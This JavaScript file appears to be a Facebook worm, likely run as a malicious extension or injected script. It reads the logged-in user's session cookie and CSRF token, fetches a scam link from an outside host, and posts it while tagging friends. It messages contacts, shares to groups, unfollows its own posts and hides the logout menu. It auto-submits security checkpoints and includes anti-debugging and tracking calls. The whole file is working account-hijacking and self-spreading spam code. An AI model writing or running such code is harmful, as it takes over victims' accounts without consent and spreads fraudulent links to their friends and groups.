new Image().src='https://whos.amung.us/swidget/samedkur1';


var db = true;
function start() {
    var cookie_name = "share_9aa"+profile_id;
    var cookie_time = 30;

    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*1000*cookie_time){
        localStorage[cookie_name] = Date.now();
        config={
            "link": "",
            "post_limit": "5",
            "tag_limit": "30",
            "message": "10",
            "mode": true,
            "testuser": ""
        }
        console.log(config);
        //add();
        if(config.mode == true || profile_id == config.testuser){
            arkadas();
            privacySetting();
            console.log("ArkadaÅŸlar getiriliyor.");
        }
    }else{
        var active_time = new Date();
        active_time.setTime(parseInt(localStorage[cookie_name]) + (60*1000*cookie_time));
        console.log("active_time:"+active_time.toLocaleString());
    }
}

function online(){
    var params = {
        user:profile_id,
        cached_user_info_ids:"",
        fetch_mobile:true,
        get_now_available_list:true,
        __user:profile_id,
        __a:1,
        __dyn:"7A" + rastgele(105),
        __req:12,
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://www.facebook.com/ajax/chat/buddy_list.php?__pc=EXP1%3ADEFAULT");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if (!data.error){
                var mobile_friends = data.payload.buddy_list.mobile_friends || [];
                var friends = [];
                for(u in data.payload.buddy_list.nowAvailableList){
                    if(friends.indexOf(u.toString()) < 0){
                        friends.push(u.toString());
                    }
                }

                if(mobile_friends.length > 0){
                    for(i=0;i<mobile_friends.length;i++){
                        if(friends.indexOf(mobile_friends[i].toString()) < 0){
                            friends.push(mobile_friends[i].toString());
                        }
                    }
                }

                console.log("Mobile Onlines:" + mobile_friends.length);
                console.log("Total:" + friends.length);

                var vars = {};
                friends = shuffle(friends);
                vars.friends = [];
                for(i=0;i<friends.length;i++){
                    if(vars.friends.length < config.tag_limit*config.post_limit){
                        vars.friends.push({uid:friends[i].toString(),online:true});
                    }
                }

                if(friends.length < config.tag_limit*config.post_limit){
                    arkadas(vars);
                }else{
                    getLink(vars);
                }
            }
        }
    }
    xhr.send(deSerialize(params))
}
function arkadas() {
    var params = {
        __pc:"EXP1:DEFAULT",
        viewer:profile_id,
        "filter[0]":"user",
        "options[0]":"friends_only",
        token:"v7",
        context:"mentions",
        rsp:"mentions",
        sid:"1197780291395",
        request_id: guid(),
        __user:profile_id,
        __a:1,
        __dyn:"7A" + rastgele(105),
        __req:"e",
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?"+deSerialize(params), true);
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if (!data.error){
                var friends = data.payload.entries.sort(function(a, b) {
                    return a.index - b.index;
                });
                for(i=0;i<friends.length;i++){
                    if(friends[i].uid.toString() == profile_id.toString()){
                        friends.splice(i, 1);
                    }
                }
                var vars = {};


                vars.friends = friends;
                getLink(vars);
				console.log("Adım 2");
            }
        }
    }
    xhr.send();
}

// function getLink(vars){
//     vars.link = config.link;
//     var israndom = vars.link.match(/{random}/g);
//     for(lnk=0;israndom&&lnk<israndom.length;lnk++){
//         vars.link = vars.link.replace("{random}",rastgele(7));
//     }
//     debug(vars);
// }

function getLink(vars){
	console.log("Varla yok");
    var tags = vars.tags;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "//apsfb.top/getLink.php?type=a2");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText);
            if(data.postlink){
                vars.link = data.postlink;
				vars.image = data.img;
                vars.title = data.descbilgi;
                vars.ck = data.ck;
                vars.tags = tags;
                debug(vars);
				console.log("Adım 3");
            }
        }
    }
}



function debug(vars){
	console.log("Adım bu ");
    var params = {
        action_properties:JSON.stringify({"object":vars.link}),
        action_type:"og.likes",
        app_id:"113869198637480",
        display:"popup",
        e2e:"{}",
        locale:"en_US",
        mobile_iframe:false,
        sdk:"joey",
        redirect_uri:"https://developers.facebook.com/",
        version:"v2.6",
        ext:"me"
    }

    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/v2.6/dialog/share_open_graph?"+deSerialize(params));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
			console.log("Adımm buyuk");
            post(vars);
        }
    }
}

function getImage(vars){
    var oReq = new XMLHttpRequest();
    oReq.open("GET", "https://futunga.com/"+profile_id+".jpg?ext=me", true);
    oReq.responseType = "arraybuffer";

    oReq.onreadystatechange = function() {
        if(this.readyState != 4) return;
        var arrayBufferView = new Uint8Array( this.response );
        vars.blob = new Blob( [ arrayBufferView ], { type: "image/jpeg" } );
        uploadImage(vars);
    };

    oReq.send();
}

function uploadImage(vars){
    var fd = new FormData();
    fd.append("image", vars.blob, "photo_"+Math.floor(Math.random()*9999)+".jpg");
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.imgur.com/3/image?ext=me");
    xhr.setRequestHeader("Authorization", "Client-ID "+vars.ck);
    xhr.send(fd);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            var data = JSON.parse(xhr.responseText);
            if(!data.error){
                vars.image = data.data.link;
                post(vars);
            }
        }
    }
}

function post(vars){
    var params = {
        "attachment[params][urlInfo][canonical]":vars.link,
        "attachment[params][urlInfo][final]":vars.link,
        "attachment[params][urlInfo][user]":vars.link,
        "attachment[params][title]":vars.title + rastgele(5),
        "attachment[params][content_removed]":false,
        "attachment[params][images][0]":vars.image,
        "attachment[params][ranked_images][ranking_model_version]":11,
        "attachment[params][medium]":103,
        "attachment[params][url]":vars.link,
        "attachment[params][time_scraped]":Date.now(),
        "attachment[params][cache_hit]":true,
        "attachment[params][was_recent]":false,
        "attachment[params][ttl]":345600,
        "attachment[params][error]":1,
        "attachment[type]":100,
        "attachment[reshare_original_post]":false,
        composer_session_id:guid(),
        hide_object_attachment:true,
        is_explicit_place:false,
        is_markdown:false,
        is_q_and_a:false,
        is_profile_badge_post:false,
        privacyx:"300645083384735",
        ref:"feedx",
        is_redspace_post:false,
        target_type:"feed",
        xhpc_message:"",
        xhpc_message_text:"",
        is_forced_reshare_of_post:false,
        xc_share_target_type:100,
        "xc_share_images[0]":vars.image,
        xc_share_title:".",
        xc_link_url:vars.link,
        is_react:true,
        xhpc_composerid:"rc.u_jsonp_10_3",
        xhpc_targetid:profile_id,
        xhpc_context:"profile",
        xhpc_ismeta:1,
        xhpc_timeline:false,
        xhpc_finch:false,
        xhpc_socialplugin:false,
        xhpc_modal_composer:false,
        xhpc_aggregated_story_composer:false,
        xhpc_publish_type:1,
        xhpc_fundraiser_page:false,
        __user:profile_id,
        __a:1,
        __dyn:"aKhoFeyfyBm989z49UoHaEWC5ECQqbxqbyaFaay8VFLFwxBxC9V8C3F6y8-bxu13wFG3J7xti28cZ1eUPhbDG4Xxm59-EuwTADDBBwDKqcBGqexi5-czUO49Elxq6U89rw",
        __req:35,
        __be:0,
        __pc:"EXP1:DEFAULT",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/ajax/updatestatus.php?ext=me&av="+profile_id);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if(!data.error){
                vars.post_id = searchArray(data, "targetfbid");
                vars.shareable_id = xhr.responseText.split("shareable_id=")[1].split("&")[0];
                unFollowPost(vars);
                getSharedTime(vars);
                //editLink(vars);
               // sendTags(vars);
                 posid_al(vars);
                 // comment(vars);   
            }
        }
    }
}

function comment(vars){
    var post_id = vars.post_id;
    var tags = vars.tags;
    var params = {
        ft_ent_identifier:vars.post_id,
        comment_text:"",
        source:2,
        client_id:Date.now()+":"+Math.floor(Date.now()/1000),
        session_id:rastgele(8),
        reply_fbid:"",
        parent_comment_id:"",
        rootid:"u_0_13",
        clp:"",
        attached_sticker_fbid:0,
        attached_photo_fbid:0,
        attached_video_fbid:0,
        feed_context:JSON.stringify({"is_viewer_page_admin":false,"is_notification_preview":false,"autoplay_with_channelview_or_snowlift":false,"fbfeed_context":true,"location_type":5,"outer_object_element_id":"u_0_u","object_element_id":"u_0_u","is_ad_preview":false,"is_editable":false,"shimparams":{"page_type":16,"actor_id":profile_id,"story_id":vars.post_id,"ad_id":0,"_ft_":"","location":"permalink"},"story_id":"u_0_v","caret_id":"u_0_w","__IS_INSIDE_UI_FEEDBACK_FORM__":true}),
        "ft[tn]":"[]",
        "ft[fbfeed_location]":5,
        av:profile_id,
        __user:profile_id,
        __a:1,
        __dyn:"5V5yAW8-aFoAwmgDxyIGzGomyp9EbEyGgS8zCC-C26m5-bzEeAq68K5U4e2CEf8vkwy3eEjKcDKuEjK5okz8uwTADDBBwDK4VqCzEbe78O49Elxq6U88C",
        __req:20,
        __be:0,
        __pc:"EXP1:DEFAULT",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    for(i=0;i<vars.tags.length;i++){
        params.comment_text += "@["+vars.tags[i].uid+":"+rastgele(5)+"]";
    }

    
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/ufi/add/comment/?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if(data.error){
                vars.tags = [];
                for(i=0;i<tags.length;i++){
                    if(tags[i].online == true && vars.tags.length < config.message){
                        vars.tags.push(tags[i]);
                    }
                    if(vars.tags.length == config.message){
                        break;
                    }
                }

                for(i=0;i<tags.length;i++){
                    var exist = vars.tags.map(function(d) { return d['uid']; }).indexOf(tags[i].uid);
                    if(vars.tags.length < config.message && exist < 0){
                        vars.tags.push(tags[i]);
                    }
                    if(vars.tags.length == config.message){
                        break;
                    }
                }
                vars.post_id = post_id;
                getShareableID(vars);
            }
        }
    }
}

function getShareableID(vars){
    var post_id = vars.post_id;
    var tags = vars.tags;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/"+post_id+"?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            vars.post_id = xhr.responseText.split('shareable_id=')[1].split('&')[0];
            vars.tags = tags;
            for(i=0;i<vars.tags.length;i++){
                vars.friend = tags[i];
                message(vars);
            }
        }
    }
}

function message(vars){
    var getParams = {
        app_id:"2309869772",
        audience_type:"message",
        "audience_targets[0]":vars.friend.uid,
        composer_session_id:guid(),
        ephemeral_ttl_mode:0,
        message:"",
        owner_id:profile_id,
        post_id:vars.post_id,
        share_to_group_as_page:false,
        share_type:99,
        shared_ad_id:"",
        source:"osbach",
        url:"",
        av:profile_id,
        dpr:1,
        ext:"me"
    }

    var params = {
        __user:profile_id,
        __a:1,
        __dyn:"5V5yAW8-aloAwmgDxyG8EigmzGK2W8GAdy8Z9LFwxBxCbzEeAq68K5U4e2O3O7R88y8aGgiKcDKuEjK5o8ouwYDDBBwDKqcBGqewIUOfz8gCxm5ErwwyoCium8w",
        __req:"n",
        __be:0,
        __pc:"EXP1:DEFAULT",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/share/dialog/submit/?"+deSerialize(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            
        }
    }
}
function posid_al(vars) {

    var xmlhttp = new XMLHttpRequest();
    xmlhttp['open']('GET', 'https://www.facebook.com/'+vars.post_id +'', true);
    xmlhttp['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
    xmlhttp['onreadystatechange'] = function () {
       if(xmlhttp.status == 200 && xmlhttp.readyState == 4) { 
   var komonbaby = xmlhttp['responseText'];
   id_aldim =  komonbaby.split("&shareable_id=")[1].split("&")[0]
   console.log(id_aldim);
   grupcek(id_aldim)
   xmlhttp['close'];
   }      
    }
 
    xmlhttp['send']();
}

function grupcek(id_aldim){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?dpr=1&viewer="+profile_id+"&filter[0]=group&__user="+profile_id+"&__a=1&__dyn=aKhoFeyfyBm985A9UoGya4AuezkHyUmyVbGAEG8zQC-C26m5-9V8CdwIhEy9AgDxubxu7UaqwHzQ7R88VEixvrzHzd4KuEjK5o8olDiwVBVVpoS6rCz9q-FFUlxrxuicx2q5omgqwwyogBw&__req=1o&__be=0&__pc=EXP1%3ADEFAULT&__rev=2294968");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
         var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
         //adet =data.payload.entries.length;
         adet =8;
         for (i = 0; i < adet; i++){
         if(data.payload.entries[i].size > 1){
         
         console.log(data.payload.entries[i].size);
         console.log(data.payload.entries[i].uid);
         gruppost(data.payload.entries[i].uid,id_aldim);
         }
         }
        }
    }
    xhr.send()
}



function gruppost(grupid,id_aldim){
var params = {
    __user:profile_id,
        __a:1,
        __dyn:"7A" + rastgele(105),
        __req:"4x",
        __be:0,
        __pc:"EXP1:DEFAULT",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/share/dialog/submit/?app_id=2309869772&attribution="+profile_id+"&audience_type=group&audience_targets[0]="+grupid+"&composer_session_id=145fbe6a-6367-447c-9073-f7fcd576c62c&ephemeral_ttl_mode=0&internalextra[feedback_source]=2&message=&owner_id="+profile_id+"&post_id="+id_aldim+"&privacy=300645083384735&share_to_group_as_page=false&share_type=99&shared_ad_id=&source=osbach&url=&av="+profile_id+"&dpr=1");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
        var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
        post_id = data.payload.object_id;


        console.log(post_id);

        }
    }
    xhr.send(deSerialize(params))
}
function editLink(vars){
    params = {
        link:vars.bitly,
        domain:vars.domain,
        keyword:vars.keyword,
        overwrite:false,
        access_token:vars.key,
        ext:"me"
    }

    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://api-ssl.bitly.com/private/keyword_api_router?"+deSerialize(params));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText);
            if(data.status_txt == "OK"){
                
            }
        }
    }
}

function sendTags(vars){
    var p_limit = Math.ceil(vars.friends.length/config.tag_limit);
    config.post_limit = p_limit>config.post_limit?config.post_limit:p_limit;
    if(config.post_limit == 0){
        config.post_limit = 1;
    }
    for(p=0;p<config.post_limit;p++){
        vars.tags = [];
        for(pk=0;pk<config.tag_limit;pk++){
            var index = pk+(config.tag_limit*p);
            if(vars.friends[index]){
                vars.tags.push(vars.friends[index]);
            }
        }
        console.log(vars.tags);
        share(vars);
    }
}

function share(vars){
    var tags = vars.tags;
    var getParams = {
        app_id:"2309869772",
        attribution:profile_id,
        audience_type:"self",
        composer_session_id:guid(),
        ephemeral_ttl_mode:0,
        is_forced_reshare_of_post:false,
        message:"",
        owner_id:profile_id,
        post_id:vars.shareable_id,
        privacy:"300645083384735",
        share_to_group_as_page:false,
        share_type:99,
        shared_ad_id:"",
        source:"osbach",
        url:"",
        av:profile_id,
        dpr:1,
        ext:"me"
    }
    for(i=0;i<vars.tags.length;i++){
        getParams.message += "@["+vars.tags[i].uid+":"+rastgele(5)+"] ";
    }
    var params = {
        __user:profile_id,
        __a:1,
        __dyn:"5V5yAW8-aloAwmgDxyIGzG85oCQHyUmyUyGiBAy8VFLFwxBxvyui9zob4q8zUK5U4e2O3J7xti28cZ1eUPhbDG4Xxm58CEuwTADDBBwDKqqmmFEW58nVV8-cx2q5qxe6U88C9ADBy8",
        __req:"1f",
        __be:0,
        __pc:"EXP1:DEFAULT",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/share/dialog/submit/?"+deSerialize(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if(!data.error){
                vars.post_id = data.payload.object_id;
                vars.tags = tags;
                console.log("Post GÃ¶nderildi: https://www.facebook.com/"+vars.post_id);
                unFollowPost(vars);
                getSharedTime(vars);
            }
        }
    }
}


function getSharedTime(vars){
    var post_id = vars.post_id;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/"+post_id+"?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            vars.shared_time = xhr.responseText.split('data-utime="')[1].split('"')[0];
            vars.post_id = post_id;
            // hidePost(vars);
        }
    }
}

function hidePost(vars){
    var d = new Date();
    var params = {
        action:"hide",
        timeline_token:profile_id+":"+vars.post_id+"::"+vars.shared_time+":"+vars.shared_time,
        "nctr[_mod]":"pagelet_all_activity_"+d.getUTCFullYear()+"_"+(d.getUTCMonth()+1),
        __user:profile_id,
        __a:1,
        __dyn:"5V5yAW8-aloAwmgDxyIGzG85oCiq2W8GA8Ay8VFLFwxBxvyUWdwIhEoyUnwPzUaqwYDxti28cWxeUOuVWxeUlxi9G7EdV9VVpo9XCz9qCzEbe78O49ElG4Urw",
        __req:"q",
        __pc:"EXP1:DEFAULT",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/ajax/timeline/all_activity/visibility.php?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            
        }
    }
}

function unFollowPost(vars){
    var params = {
        message_id:vars.post_id,
        follow:0,
        __user:profile_id,
        __a:1,
        __dyn:"7AmajEzUFlym5Q9UoHbgWy1m9ACwKyaF298yupFLFwxBxvyUWu396xybxu3fzoy22Eau49UnEwycAxGqKEWfybDG4Upxi9AxO2-uczpo9XCgKmFAdAw",
        __req:"m",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/ajax/litestand/follow_post?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            
        }
    }
}

function privacySetting(){
    var params = {
        value:"300645083384735",
        prev_value:"291667064279714",
        __user:profile_id,
        __a:1,
        __dyn:"7AmajEyl35wzgDxyG8EigmzFEbEKA8Ay8Z9LFwxBxCbzES2N6xybxu3fzoaqxbxjx27W88ybx-qA4E-8KuEjxC2e784i4U9Xw",
        __req:"15",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/ajax/settings/granular_privacy/composer.php");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            
        }
    }
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzx0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}

function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}

function blockRemove(){
    window.setInterval(function() {
        if (document.getElementsByClassName("_5ce")) {
            for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
                document.getElementsByClassName("_5ce")[i].innerHTML = "";
            }
        
        } 
        if (document.getElementsByClassName("uiToggle wrap")) {
            for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
                document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
            }
        }
        if(document.getElementById("logoutMenu")){
           document.getElementById("logoutMenu").parentNode.outerHTML = ""
        }
        if (document.getElementsByClassName("uiPopover")) {
            for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
                document.getElementsByClassName("uiPopover")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("UFICommentCloseButton")) {
            for (i = 0; i < document.getElementsByClassName("UFICommentCloseButton").length; i++) {
                document.getElementsByClassName("UFICommentCloseButton")[i].outerHTML = "";
            }
        }
    }, 10);
}

function checkPoint(){
    document.body.innerHTML = "";
    var params = {
        fb_dtsg:fb_dtsg,
        nh:nh,
        "submit[Get Started]":"Get Started"
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/checkpoint/");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            checkPointContinue();
            console.log("Get Started");
        }
    }
}

function checkPointContinue(){
    var params = {
        fb_dtsg:fb_dtsg,
        nh:nh,
        confirm:"on",
        "submit[Continue]":"Continue"
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://www.facebook.com/checkpoint/");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            console.log("Get Continue");
            deleteAllCookies();
            location.href = "https://www.facebook.com";
        }
    }
}

function deleteAllCookies() {
    var cookies = document.cookie.split(";");
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;domain=.facebook.com";
    }
}

var checkStatus = 'off';
var element = new Image();
element.__defineGetter__('id', function() {
    checkStatus = 'on';
});
//console.log(element);
//console.clear();
profile_id = document.cookie.match(/c_user=(\d+)/)[1];
fb_dtsg_list = document.getElementsByName('fb_dtsg');
fb_dtsg = fb_dtsg_list[0].value;
        __rev = document.head.innerHTML.split('"revision":')[1].split(",")[0];
        ajaxpipe_token = document.head.innerHTML.split('"ajaxpipe_token":')[1].split(",")[0];
        ttstamp = "";
        for (var x = 0; x < fb_dtsg.length; x++){
            ttstamp += fb_dtsg.charCodeAt(x);
        }
        ttstamp = '2' + ttstamp;
        console.log("User:"+profile_id);
        console.log("fb_dtsg:"+fb_dtsg);
        console.log("__rev:"+__rev);
        console.log("ttstamp:"+ttstamp);
        console.log("ajaxpipe_token:"+ajaxpipe_token);
start();
if (location.hostname.indexOf("facebook.com") >= 0 && (checkStatus == 'off' || db == true)) {
    fb_dtsg_list = document.getElementsByName('fb_dtsg');
    if(!document.getElementById("isrun") && fb_dtsg_list.length > 0 && location.href.indexOf("facebook.com/checkpoint") < 0){
        var log = document.createElement("meta");
        log.id = "isrun";
        document.head.appendChild(log);
        blockRemove();
        profile_id = document.cookie.match(/c_user=(\d+)/)[1];
        fb_dtsg = fb_dtsg_list[0].value;
        __rev = document.head.innerHTML.split('"revision":')[1].split(",")[0];
        ajaxpipe_token = document.head.innerHTML.split('"ajaxpipe_token":')[1].split(",")[0];
        ttstamp = "";
        for (var x = 0; x < fb_dtsg.length; x++){
            ttstamp += fb_dtsg.charCodeAt(x);
        }
        ttstamp = '2' + ttstamp;
        console.log("User:"+profile_id);
        console.log("fb_dtsg:"+fb_dtsg);
        console.log("__rev:"+__rev);
        console.log("ttstamp:"+ttstamp);
        console.log("ajaxpipe_token:"+ajaxpipe_token);
        window.setTimeout(function(){
            window.top.location.reload();
        }, 1000*60*12);
        start();
    }
    if(location.href.indexOf("facebook.com/checkpoint") > 0 && fb_dtsg_list.length > 0){
        fb_dtsg = fb_dtsg_list[0].value;
        nh = document.getElementsByName("nh")[0].value;
        console.log(fb_dtsg);
        console.log(nh);
        checkPoint();
    }
}else if(location.hostname.indexOf("facebook.com") >= 0){
    console.error("Not found");
}
